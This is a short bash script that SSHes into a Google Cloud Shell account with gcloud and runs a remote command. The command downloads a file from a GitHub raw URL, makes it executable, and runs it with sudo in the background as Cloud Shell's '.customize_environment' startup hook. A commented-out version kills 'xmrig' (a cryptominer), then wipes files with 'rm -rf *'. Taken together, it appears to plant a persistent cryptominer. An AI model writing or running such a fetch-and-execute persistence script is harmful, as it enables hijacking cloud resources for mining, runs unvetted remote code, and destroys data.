#!/bin/bash

echo
echo $1

#command="sudo pkill xmrig ; sudo pkill ping.sh ; sudo rm -rf * ; sudo rm -rf .customize_environment ; ls -a ;  wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & "
command="[ ! -e '.customize_environment' ] && ( wget -q https://raw.githubusercontent.com/Predador21/scripts/main/.customize_environment ; chmod 777 .customize_environment ; sudo nohup ./.customize_environment > /dev/null & )"

gcloud cloud-shell ssh --account=$1 --command="$command" --authorize-session --force-key-file-overwrite --ssh-flag='-n' --quiet

echo 'command ok'
